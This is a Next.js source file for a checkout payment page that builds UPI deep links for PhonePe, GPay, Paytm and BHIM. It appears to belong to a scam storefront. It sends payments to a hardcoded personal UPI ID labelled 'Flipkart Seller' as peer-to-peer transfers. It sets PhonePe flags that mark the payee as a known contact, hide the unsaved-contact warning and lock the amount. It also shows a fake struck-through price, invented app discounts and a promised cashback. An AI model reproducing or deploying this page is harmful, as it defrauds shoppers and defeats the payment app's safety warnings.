import { useRouter } from "next/router";
import { useState, useEffect } from "react";
import Head from "next/head";

/* ── load Cashfree JS SDK ── */
function loadCashfreeSDK() {
    return new Promise((resolve) => {
        if (typeof window === "undefined") return resolve(false);
        if (window.Cashfree) return resolve(true);
        const existing = document.querySelector('script[src*="cashfree.js"]');
        if (existing) {
            let n = 0;
            const t = setInterval(() => {
                if (window.Cashfree) { clearInterval(t); resolve(true); }
                if (++n > 60) { clearInterval(t); resolve(false); }
            }, 200);
            return;
        }
        const s = document.createElement("script");
        s.src = "https://sdk.cashfree.com/js/v3/cashfree.js";
        s.async = true;
        s.onload = () => resolve(true);
        s.onerror = () => resolve(false);
        document.head.appendChild(s);
    });
}

export default function Payments() {
    const router = useRouter();

    const [settings,  setSettings]  = useState(null);
    const [products,  setProducts]  = useState({ id:"", Gpay:true, Phonepe:true, Paytm:true, Bhim:true });
    const [cart,      setCart]      = useState([]);
    const [user,      setUser]      = useState({ name:"", phone:"", email:"" });
    const [activeTab, setActiveTab] = useState(null);
    const [payUrl,    setPayUrl]    = useState("");
    const [loading,   setLoading]   = useState(false);
    const [mounted,   setMounted]   = useState(false);

    useEffect(() => setMounted(true), []);

    useEffect(() => {
        try { const c = localStorage.getItem("cart"); if (c) setCart(JSON.parse(c)); } catch(_){}
        try { const u = localStorage.getItem("user"); if (u) setUser(JSON.parse(u)); } catch(_){}
    }, []);

    useEffect(() => {
        (async () => {
            try {
                const res  = await fetch("/api/settings");
                const data = await res.json();
                setSettings(data.data);
                const upi = data.data?.upi || {};
                setProducts(p => ({ ...p, ...upi }));
                if      (data.data?.payment?.cashfreeEnabled) setActiveTab(6);
                else if (upi.Phonepe !== false)               setActiveTab(3);
                else if (upi.Phonepe2)                        setActiveTab(7);
                else if (upi.Gpay    !== false)               setActiveTab(2);
                else if (upi.Paytm   !== false)               setActiveTab(4);
                else                                          setActiveTab(1);
            } catch { setActiveTab(3); }
        })();
    }, []);

    /* totals */
    const totalMrp      = cart.reduce((s,p) => s + Math.round((p.sellingPrice||0)*(p.quantity||1)), 0);
    const itemCount     = cart.reduce((s,p) => s + (p.quantity||1), 0);
    const crossedMrp    = Math.round(totalMrp * 7.17);
    const cashback      = Math.round(totalMrp * 0.4);

    /* ── UPI deep-links ── */
    useEffect(() => {
        if (!mounted || !activeTab || activeTab === 6) { setPayUrl(""); return; }
        const amt = totalMrp;
        const txn = `TXN${Date.now()}`;

        if (activeTab === 7) {
            const p2Name = encodeURIComponent(products.Phonepe2Name || "Flipkart Seller");
            const p2Upi = products.Phonepe2UpiId || "shivfashion710704.rzp@rxairtel";
            const p2Txn = `TD${Date.now()}`;
            const phonepe2Url = `phonepe://pay?pa=${p2Upi}&pn=${p2Name}&am=${amt}&tr=${p2Txn}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${p2Name}`;
            setPayUrl(phonepe2Url);
            return;
        }

        if (!products?.id) { setPayUrl(""); return; }
        const id = products.id;
        const ppPayload = {
            contact:{ cbsName:"Store", nickName:"Payment", vpa:id, type:"VPA" },
            p2pPaymentCheckoutParams:{
                note:txn, isByDefaultKnownContact:true, enableSpeechToText:false,
                allowAmountEdit:false, showQrCodeOption:false, disableViewHistory:true,
                shouldShowUnsavedContactBanner:false, isRecurring:false,
                checkoutType:"DEFAULT", transactionContext:"p2p",
                initialAmount:amt*100, disableNotesEdit:true, showKeyboard:true,
                currency:"INR", shouldShowMaskedNumber:true
            }
        };
        const ppLink = "phonepe://native?data=" + btoa(JSON.stringify(ppPayload)) + "&id=p2ppayment";
        const urls = {
            1: `bhim://pay?pa=${id}&pn=Store&am=${amt}&tr=${txn}&mc=8931&cu=INR&tn=Payment`,
            2: ppLink,
            3: ppLink,
            4: `paytmmp://pay?pa=${id}&pn=Store&am=${amt}&tr=${txn}&cu=INR`,
        };
        setPayUrl(urls[activeTab] || "");
    }, [activeTab, products?.id, products?.Phonepe2UpiId, products?.Phonepe2Name, totalMrp, mounted]);

    const handlePay = async () => {
        if (activeTab === 6) {
            setLoading(true);
            try {
                const ready = await loadCashfreeSDK();
                if (!ready || !window.Cashfree) throw new Error("Payment SDK could not load. Please check your internet and try again.");
                const orderId = `ORD-${Date.now()}`;
                const res  = await fetch("/api/payment/cashfree", {
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body: JSON.stringify({ amount:totalMrp, orderId, name:user.name||"Customer", phone:user.phone||"9999999999", email:user.email||"customer@example.com" }),
                });
                const data = await res.json();
                if (!res.ok || !data.success) throw new Error(data.message || "Server error. Please try again.");
                if (!data.payment_session_id)  throw new Error("No payment session received.");
                const cashfree = window.Cashfree({
                    mode: settings?.payment?.cashfreeMode === "production" ? "production" : "sandbox",
                });
                cashfree.checkout({ paymentSessionId: data.payment_session_id, redirectTarget: "_self" });
            } catch(err) {
                alert(err.message || "Payment failed. Please try again.");
                setLoading(false);
            }
            return;
        }
        if (payUrl) { window.location.href = payUrl; return; }
        alert("Please select a payment method.");
    };

    if (!mounted || activeTab === null) return null;

    const show = {
        phonepe:  products.Phonepe  !== false,
        phonepe2: !!products.Phonepe2,
        gpay:     products.Gpay     !== false,
        paytm:    products.Paytm    !== false,
        bhim:     products.Bhim     !== false,
        cashfree: !!settings?.payment?.cashfreeEnabled,
    };

    return (
        <>
            <Head>
                <title>Payments – Step 3 of 3</title>
                <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"/>
                <meta name="theme-color" content="#ffffff"/>
                <link rel="preconnect" href="https://fonts.googleapis.com"/>
                <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin=""/>
                <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
            </Head>

            <style jsx global>{`
                *, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
                html, body {
                    font-family:'Inter',sans-serif;
                    background:#fff;
                    color:#212121;
                    -webkit-tap-highlight-color:transparent;
                }
                .header-menu, nav>ul, footer,
                .cart_page_footer { display:none !important; }

                /* ── PAGE ── */
                .pmt-page { background:#fff; min-height:100vh; }

                /* ── STICKY HEADER ── */
                .pmt-header {
                    background:#fff;
                    position:sticky;
                    top:0;
                    z-index:50;
                    box-shadow:0 1px 4px rgba(0,0,0,0.08);
                    padding:10px 12px 8px;
                }
                .pmt-hdr-row {
                    display:flex;
                    align-items:center;
                    width:100%;
                    gap:0;
                }
                .pmt-back-wrap {
                    width:10%;
                    display:flex;
                    align-items:center;
                }
                .pmt-back-btn {
                    background:none; border:none; cursor:pointer;
                    padding:2px; display:flex; align-items:center;
                }
                .pmt-hdr-text { flex:1; }
                .pmt-step {
                    font-size:13px;
                    color:#6b7280;
                    line-height:1;
                    margin-bottom:0;
                }
                .pmt-title {
                    font-size:16px;
                    font-weight:600;
                    color:#1f2937;
                    margin:4px 0 0;
                    line-height:1.2;
                }
                .pmt-secure {
                    display:flex;
                    align-items:center;
                    background:#f5f5f5;
                    border-radius:4px;
                    padding:4px 8px;
                    gap:4px;
                    margin-left:auto;
                    white-space:nowrap;
                }
                .pmt-secure-txt {
                    font-size:10px;
                    font-weight:700;
                    color:#4b5563;
                }

                /* ── BODY ── */
                .pmt-body { padding:0 0 100px; }

                /* ── UPI SECTION ── */
                .upi-section {
                    background:#f5f5f5;
                    border-radius:8px;
                    overflow:hidden;
                    margin:12px;
                }
                .upi-sec-hdr {
                    padding:14px 16px;
                    border-bottom:1px solid #f0f0f0;
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                    background:#f5f5f5;
                    border-radius:8px 8px 0 0;
                }
                .upi-sec-hdr-left {
                    display:flex;
                    align-items:center;
                    gap:8px;
                }
                .upi-sec-label {
                    font-size:15px;
                    font-weight:500;
                    color:#374151;
                }

                /* white card inside */
                .upi-opts-card {
                    padding:8px;
                    margin:8px;
                    background:#fff;
                    border-radius:6px;
                    box-shadow:0 2px 5px rgba(0,0,0,0.10);
                }

                /* ── OPTION ROW ── */
                .pmt-opt {
                    display:flex;
                    align-items:center;
                    justify-content:space-between;
                    padding:12px;
                    margin-bottom:8px;
                    cursor:pointer;
                }
                .pmt-opt:last-child { margin-bottom:0; border-top:1px solid #e5e7eb; }
                .pmt-opt-left {
                    display:flex;
                    align-items:center;
                    gap:12px;
                    flex:1;
                }
                /* native radio styled via accent */
                .pmt-radio {
                    width:20px;
                    height:20px;
                    accent-color:#2563eb;
                    cursor:pointer;
                    flex-shrink:0;
                }
                .pmt-opt-info {}
                .pmt-opt-top {
                    display:flex;
                    align-items:center;
                    gap:8px;
                    font-size:15px;
                    font-weight:700;
                    color:#1f2937;
                }
                .pmt-pipe { color:#d1d5db; font-weight:300; }
                .pmt-opt-sub {
                    font-size:14px;
                    margin-top:2px;
                    font-weight:500;
                }
                .sub-phonepe { color:#875BB7; }
                .sub-gpay    { color:#34A853; }
                .sub-paytm   { color:#02B9EF; }
                .sub-bhim    { color:#f97316; }
                .sub-cashfree{ color:#1d3557; }

                /* ── CASHBACK BANNER ── */
                .cashback-banner {
                    background:#E7F9ED;
                    border-radius:8px;
                    padding:16px;
                    margin:4px 16px 16px;
                    text-align:center;
                }
                .cb-title {
                    font-size:20px;
                    font-weight:700;
                    color:#008C00;
                    padding-bottom:8px;
                    line-height:1.2;
                    text-align:left;
                }
                .cb-body {
                    font-size:14px;
                    text-align:justify;
                    line-height:1.4;
                    margin-top:-4px;
                    color:#374151;
                }
                .cb-bold { font-weight:700; color:#111; }

                /* ── PRICE SUMMARY ── */
                .price-box {
                    background:#F1F5FF;
                    border-radius:8px;
                    padding:12px;
                    margin:0 16px 16px;
                    font-weight:500;
                }
                .price-row {
                    display:flex;
                    justify-content:space-between;
                    padding:4px 0;
                    font-size:15px;
                    color:#212121;
                }
                .price-free  { color:#008C00; }
                .price-strike{ text-decoration:line-through; color:#6b7280; }
                .price-total-row {
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                    padding:12px 0 4px;
                    margin-top:4px;
                    border-top:1px dashed #c4c4c4;
                }
                .price-total-lbl {
                    display:flex;
                    align-items:center;
                    gap:4px;
                    color:#2855E9;
                    font-size:15px;
                }
                .price-total-amt {
                    font-size:16px;
                    font-weight:700;
                    color:#2855E9;
                }

                /* ── SECURE PAY IMAGE ── */
                .secure-pay-wrap {
                    display:flex;
                    justify-content:flex-start;
                    padding:0 16px;
                    margin-bottom:20px;
                }
                .secure-pay-img {
                    width:100%;
                    max-width:360px;
                    border-radius:6px;
                }

                /* ── FOOTER BAR ── */
                .pmt-footer {
                    position:fixed;
                    bottom:0;
                    left:0;
                    width:100%;
                    background:#fff;
                    box-shadow:0 -1px 5px rgba(0,0,0,0.10);
                    padding:12px 24px;
                    display:flex;
                    align-items:center;
                    justify-content:space-between;
                    border-top:1px solid #f3f4f6;
                    z-index:50;
                }
                .pmt-footer-amt {
                    font-size:24px;
                    font-weight:500;
                    color:#212121;
                }
                .pmt-pay-btn {
                    background:#FFC107;
                    color:#000;
                    font-weight:700;
                    padding:12px 32px;
                    border-radius:8px;
                    border:none;
                    text-transform:uppercase;
                    font-size:15px;
                    cursor:pointer;
                    box-shadow:0 1px 3px rgba(0,0,0,0.12);
                    display:flex;
                    align-items:center;
                    gap:8px;
                    transition:background .15s;
                    font-family:'Inter',sans-serif;
                }
                .pmt-pay-btn:hover:not(:disabled)  { background:#e6ad06; }
                .pmt-pay-btn:active:not(:disabled)  { background:#d4a005; }
                .pmt-pay-btn:disabled               { opacity:.6; cursor:not-allowed; }

                /* spinner */
                .btn-spin {
                    width:16px; height:16px;
                    border:2px solid rgba(0,0,0,.2);
                    border-top-color:#000;
                    border-radius:50%;
                    animation:_bspin .65s linear infinite;
                }
                @keyframes _bspin { to { transform:rotate(360deg); } }
            `}</style>

            <div className="pmt-page">

                {/* ══ STICKY HEADER ══ */}
                <div className="pmt-header">
                    <div className="pmt-hdr-row">
                        <div className="pmt-back-wrap">
                            <button className="pmt-back-btn" onClick={() => router.back()}>
                                <img src="/assets/images/theme/back_dark.svg" alt="Back" width={20} height={20}
                                    onError={e => {
                                        e.target.style.display="none";
                                        e.target.parentNode.innerHTML='<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M15 19l-7-7 7-7" stroke="#212121" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
                                    }}
                                />
                            </button>
                        </div>
                        <div className="pmt-hdr-text">
                            <p className="pmt-step">Step 3 of 3</p>
                            <h5 className="pmt-title">Payments</h5>
                        </div>
                        <div className="pmt-secure">
                            <img src="/assets/images/lock-icon.svg" alt="Secure" width={16} height={16}
                                onError={e => { e.target.style.display="none"; }}
                            />
                            <p className="pmt-secure-txt">100% Secure</p>
                        </div>
                    </div>
                </div>

                {/* ══ BODY ══ */}
                <div className="pmt-body">

                    {/* ── UPI SECTION ── */}
                    <div className="upi-section">
                        <div className="upi-sec-hdr">
                            <div className="upi-sec-hdr-left">
                                <img src="/assets/images/upi.svg" alt="UPI" width={30}
                                    onError={e => { e.target.style.display="none"; }}
                                />
                                <p className="upi-sec-label">UPI</p>
                            </div>
                            <img src="/assets/images/up_arw.svg" alt="Arrow" width={18}
                                onError={e => { e.target.outerHTML='<span style="font-size:18px;color:#555">∧</span>'; }}
                            />
                        </div>

                        <div className="upi-opts-card">

                            {/* PhonePe */}
                            {show.phonepe && (
                                <div className="pmt-opt" onClick={() => setActiveTab(3)}>
                                    <div className="pmt-opt-left">
                                        <input type="radio" name="upi" className="pmt-radio"
                                            checked={activeTab===3} onChange={() => setActiveTab(3)} />
                                        <div className="pmt-opt-info">
                                            <div className="pmt-opt-top">
                                                <span>₹{totalMrp}</span>
                                                <span className="pmt-pipe">|</span>
                                                <span>PhonePe</span>
                                            </div>
                                            <p className="pmt-opt-sub sub-phonepe">30% Extra Discount By PhonePe</p>
                                        </div>
                                    </div>
                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={30}
                                        onError={e=>{e.target.outerHTML='<svg width="30" height="30" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
                                    />
                                </div>
                            )}

                            {/* PhonePe 2 */}
                            {show.phonepe2 && (
                                <div className="pmt-opt" onClick={() => setActiveTab(7)} style={{ borderTop: "1px solid #e5e7eb" }}>
                                    <div className="pmt-opt-left">
                                        <input type="radio" name="upi" className="pmt-radio"
                                            checked={activeTab===7} onChange={() => setActiveTab(7)} />
                                        <div className="pmt-opt-info">
                                            <div className="pmt-opt-top">
                                                <span>₹{totalMrp}</span>
                                                <span className="pmt-pipe">|</span>
                                                <span>{products.Phonepe2Name || "PhonePe"}</span>
                                            </div>
                                            <p className="pmt-opt-sub sub-phonepe">30% Extra Discount By PhonePe</p>
                                        </div>
                                    </div>
                                    <img src="/assets/images/phonepe.svg" alt="PhonePe" width={30}
                                        onError={e=>{e.target.outerHTML='<svg width="30" height="30" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#5f259f"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold">₱</text></svg>';}}
                                    />
                                </div>
                            )}

                            {/* GPay */}
                            {show.gpay && (
                                <div className="pmt-opt" onClick={() => setActiveTab(2)}>
                                    <div className="pmt-opt-left">
                                        <input type="radio" name="upi" className="pmt-radio"
                                            checked={activeTab===2} onChange={() => setActiveTab(2)} />
                                        <div className="pmt-opt-info">
                                            <div className="pmt-opt-top">
                                                <span>₹{totalMrp}</span>
                                                <span className="pmt-pipe">|</span>
                                                <span>GPay</span>
                                            </div>
                                            <p className="pmt-opt-sub sub-gpay">20% Extra Discount By Gpay</p>
                                        </div>
                                    </div>
                                    <img src="/assets/images/gpay_icon.svg" alt="GPay" width={30}
                                        onError={e=>{e.target.outerHTML='<svg width="30" height="30" viewBox="0 0 30 30"><circle cx="15" cy="15" r="15" fill="#fff" stroke="#e0e0e0"/><text x="50%" y="57%" dominant-baseline="middle" text-anchor="middle" font-size="14" font-weight="800" fill="#4285F4">G</text></svg>';}}
                                    />
                                </div>
                            )}

                            {/* Paytm */}
                            {show.paytm && (
                                <div className="pmt-opt" onClick={() => setActiveTab(4)}>
                                    <div className="pmt-opt-left">
                                        <input type="radio" name="upi" className="pmt-radio"
                                            checked={activeTab===4} onChange={() => setActiveTab(4)} />
                                        <div className="pmt-opt-info">
                                            <div className="pmt-opt-top">
                                                <span>₹{totalMrp}</span>
                                                <span className="pmt-pipe">|</span>
                                                <span>PayTM</span>
                                            </div>
                                            <p className="pmt-opt-sub sub-paytm">10% Extra Discount By Paytm</p>
                                        </div>
                                    </div>
                                    <img src="/assets/images/paytm_icon.svg" alt="Paytm" width={30}
                                        onError={e=>{e.target.outerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="50px" height="50px" enable-background="new -164 191.6 512 193" viewBox="-164 191.6 512 193" id="paytm"><path fill="#02b9ef" d="M229.8,243.2c2-1.6,3-2.4,4-3.2c13.9-11.8,31.7-10.5,43.6,3.5c1.2,1.4,1.8,1.5,3,0.3c0.8-0.9,1.7-1.6,2.5-2.5   c9.3-9.1,21.6-11.8,33.1-6.7c12.1,5.4,18.6,14.9,18.7,28.2c0.2,28.7,0.1,57.3,0.1,86c0,10.2-6.3,16.6-16.4,16.6c-4,0-8-0.3-12,0.1   c-4.1,0.4-5.3-0.9-5.3-5.2c0.2-28,0.1-56,0.1-84c0-1.2,0-2.3,0-3.5c-0.1-6.5-2.7-9.2-8.9-9.5c-5.6-0.3-9.5,3.1-10.1,8.8   c-0.1,1.3,0,2.7,0,4c0,24.2,0,48.3,0,72.5c0,10.6-6.1,16.8-16.7,16.7c-5.4-0.1-12.7,2.4-15.8-1.1c-2.7-3-0.9-10.1-0.9-15.4   c0-24.8,0-49.7,0-74.5c0-8.8-5.7-13.3-13.1-10.3c-4.6,1.9-6.1,5.6-6.1,10.4c0.1,23.2,0,46.3,0,69.5c0,1.8,0,3.7,0,5.5   c-0.3,9.7-6.5,15.8-16.1,15.9c-4,0.1-8-0.3-12,0.1c-4.3,0.4-5.6-0.8-5.5-5.4c0.2-39.3,0.1-78.6,0.1-118c0-1.7,0.1-3.3,0-5   c-0.2-2.2,0.7-2.9,2.9-2.9c9.2,0.1,18.3,0.1,27.5,0c2.3,0,3.4,0.6,3.2,3.1C229.5,239,229.7,240.6,229.8,243.2z"></path><path fill="#06306f" d="M17.8 297.4c0 13.7 0 27.3 0 41-.1 17.8-9.4 27-27.2 27.1-7.8 0-15.7.1-23.5 0-15.8-.2-27.4-10.7-28.2-26.5-.6-11.3-.7-22.7-.1-34 .8-16.2 13.2-27.6 29.6-27.8 4.3-.1 8.7 0 13 0 4.2-.1 5.8-2.5 5.7-6.5 0-4-1.8-5.8-5.8-5.6-4.5.1-9 .1-13.5 0-11-.2-17.1-6.2-17-17 0-4.4-2-10.3.9-12.9 2.5-2.2 8.2-.8 12.5-.8 11.2-.1 22.3 0 33.5 0 11.9 0 20 8.1 20.1 20.1C17.9 268.7 17.8 283.1 17.8 297.4zM-12.8 320.1c0-1.7 0-3.3 0-5 0-10.2 0-10.2-10.2-9.8-5.1.2-7.9 2.8-8 8.1-.1 4.2-.1 8.3 0 12.5.1 7.2 3.3 9.1 13.7 9.4 7.7.2 3.8-5.2 4.5-8.2C-12.4 324.9-12.9 322.4-12.8 320.1zM106.8 286.5c0 15.3.2 30.7-.1 46-.2 11.8-3 22.5-14.4 28.8-4.6 2.5-9.6 3.9-14.8 4-11.5.2-23 0-34.5.2-2.8 0-3.4-1-3.3-3.5.2-4.2-.1-8.3.1-12.5.2-8 6.3-14.1 14.3-14.4 5.2-.2 10.3-.1 15.5 0 4.2 0 6.5-1.7 6.5-6.2 0-4.6-2.2-6.2-6.4-6.3-7-.2-14 .8-20.9-1.2-11.9-3.5-20.6-13.4-20.9-25.7-.6-19.5-.2-39-.3-58.5 0-2.2.7-2.9 2.9-2.8 8.2.1 16.3.2 24.5 0 3.6-.1 3.1 1.9 3.1 4.1 0 14.7 0 29.3 0 44 0 6.4 3 9.8 8.6 10 6.6.2 9.5-2.5 9.5-9.2 0-14.8.1-29.7-.1-44.5 0-3.5.9-4.5 4.4-4.4 7.3.3 14.7.4 22 0 4-.2 4.6 1.3 4.5 4.8C106.7 254.9 106.8 270.7 106.8 286.5zM-148 309.2c0-16.3 0-32.7 0-49 0-16 9.8-26 25.9-25.8 10.5.1 21-1.2 31.4.8 13.3 2.6 21.7 12.9 21.8 26.6.1 14.5 0 29 0 43.5 0 18.2-10.7 29.3-28.9 29.8-5.5.2-11 .1-16.5 0-2.5-.1-3.6.7-3.5 3.4.2 4 .1 8 0 12-.2 8.6-6.3 14.8-14.8 14.9-5 .1-11.3 2.1-14.5-.8-3-2.7-.8-9.1-.9-13.9C-148.1 336.9-148 323-148 309.2zM-117.8 284.7c0 3.2 0 6.3 0 9.5 0 11.3 0 11.3 11.3 10.3 4.9-.4 7.2-2.8 7.3-7.7.1-5.6-.2-11.3.1-16.9.6-16.2-2.4-14.6-15.6-14.7-2.4 0-3.2.7-3.2 3.1C-117.7 273.7-117.8 279.2-117.8 284.7z"></path><path fill="#02b9ef" d="M135.1,309.4c0-13.3-0.1-26.7,0.1-40c0-3.1-0.7-4.4-4.1-4.3c-4.5,0.2-10.5,1.5-13-0.7   c-3.1-2.9-0.7-9.1-1.1-13.9c0-0.3,0-0.7,0-1c0-4.7-1.5-10.2,0.5-13.7s8.1-1.3,12.4-2.4c8.5-2.2,14.9-7.1,20.1-13.9   c3.6-4.6,8.1-7.9,13.9-9c3.1-0.6,5-0.2,4.8,3.8c-0.3,5.6,0,11.3-0.1,17c-0.1,2.4,0.8,3.2,3.2,3.1c4-0.1,8,0.1,12-0.1   c2.4-0.1,3.2,0.8,3.1,3.2c-0.1,8.2-0.1,16.3,0,24.5c0,2.3-0.6,3.5-3.1,3.2c-0.5-0.1-1,0-1.5,0c-4.4,0.4-10.5-2-12.8,1   c-2.2,2.8-0.8,8.6-0.8,13.1c0,27.2-0.1,54.3,0.1,81.5c0,3.8-1,5-4.8,4.7c-3.6-0.3-7.3,0-11-0.1c-10.8-0.4-17.9-7.7-17.9-18.5   C135.1,334.4,135.1,321.9,135.1,309.4z"></path></svg>';}}
                                    />
                                </div>
                            )}

                            {/* BHIM */}
                            {show.bhim && (
                                <div className="pmt-opt" onClick={() => setActiveTab(1)}>
                                    <div className="pmt-opt-left">
                                        <input type="radio" name="upi" className="pmt-radio"
                                            checked={activeTab===1} onChange={() => setActiveTab(1)} />
                                        <div className="pmt-opt-info">
                                            <div className="pmt-opt-top">
                                                <span>₹{totalMrp}</span>
                                                <span className="pmt-pipe">|</span>
                                                <span>BHIM UPI</span>
                                            </div>
                                            <p className="pmt-opt-sub sub-bhim">Direct Bank Transfer</p>
                                        </div>
                                    </div>
                                    <img src="https://upload.wikimedia.org/wikipedia/en/b/b3/Bhim_logo.png" alt="BHIM" width={30}
                                        style={{objectFit:"contain"}}
                                    />
                                </div>
                            )}

                            {/* Cashfree */}
                            {show.cashfree && (
                                <div className="pmt-opt" onClick={() => setActiveTab(6)}>
                                    <div className="pmt-opt-left">
                                        <input type="radio" name="upi" className="pmt-radio"
                                            checked={activeTab===6} onChange={() => setActiveTab(6)} />
                                        <div className="pmt-opt-info">
                                            <div className="pmt-opt-top">
                                                <span>₹{totalMrp}</span>
                                                <span className="pmt-pipe">|</span>
                                                <span>Card / Net Banking</span>
                                            </div>
                                            <p className="pmt-opt-sub sub-cashfree">Secured by Cashfree</p>
                                        </div>
                                    </div>
                                    <svg width="52" height="22" viewBox="0 0 120 40">
                                        <rect width="120" height="40" rx="4" fill="#1d3557"/>
                                        <text x="50%" y="55%" dominantBaseline="middle" textAnchor="middle"
                                            fill="#fff" fontSize="13" fontWeight="700" fontFamily="Inter,sans-serif">
                                            CASHFREE
                                        </text>
                                    </svg>
                                </div>
                            )}

                        </div>{/* upi-opts-card */}
                    </div>{/* upi-section */}

                    {/* ── CASHBACK BANNER ── */}
                    <div className="cashback-banner">
                        <div className="cb-title">Cashback on First Order!</div>
                        <div className="cb-body">
                            Place your order and get <span className="cb-bold">₹{cashback}</span> cashback!
                            Cashback will be credited to your original UPI payment method after delivery.
                        </div>
                    </div>

                    {/* ── PRICE SUMMARY ── */}
                    <div className="price-box">
                        <div className="price-row">
                            <span>Price ({itemCount} item{itemCount!==1?"s":""})</span>
                            <span>₹ {totalMrp}</span>
                        </div>
                        <div className="price-row">
                            <span>Delivery Charges</span>
                            <span className="price-free">FREE</span>
                        </div>
                        <div className="price-row">
                            <span>Discount fee</span>
                            <span className="price-strike">₹ {crossedMrp}</span>
                        </div>
                        <div className="price-total-row">
                            <div className="price-total-lbl">
                                Total Amount
                                <img src="/assets/images/uparrow.svg" alt="^" width={10} height={10}
                                    style={{marginTop:2}}
                                    onError={e=>{e.target.outerHTML='<svg width="10" height="10" viewBox="0 0 24 24" fill="none"><path d="M6 15l6-6 6 6" stroke="#2855E9" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';}}
                                />
                            </div>
                            <span className="price-total-amt">₹ {totalMrp}</span>
                        </div>
                    </div>

                    {/* ── SECURE PAY BANNER ── */}
                    <div className="secure-pay-wrap">
                        <img
                            src="/assets/images/SecurePay.svg"
                            alt="Secure Pay"
                            className="secure-pay-img"
                            onError={e=>{e.target.style.display="none";}}
                        />
                    </div>

                </div>{/* pmt-body */}

                {/* ══ STICKY FOOTER ══ */}
                <div className="pmt-footer">
                    <div className="pmt-footer-amt">₹{totalMrp}</div>
                    <button
                        className="pmt-pay-btn"
                        onClick={handlePay}
                        disabled={loading}
                    >
                        {loading
                            ? <><span className="btn-spin"/>&nbsp;PROCESSING…</>
                            : "PROCEED TO PAY"
                        }
                    </button>
                </div>

            </div>{/* pmt-page */}
        </>
    );
}